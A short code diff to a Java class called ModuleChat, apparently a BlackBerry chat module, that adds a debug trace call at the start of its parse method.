@@ -67,6 +67,10 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
     }
 
     protected boolean parse(ConfModule conf) {
+        //#ifdef DEBUG
+        debug.trace("parse");
+        //#endif
+        
         if (!Device.getInstance().atLeast(5, 0)) {
             //#ifdef DEBUG
             debug.error("ChatAgent: not supported before OS 5.0");
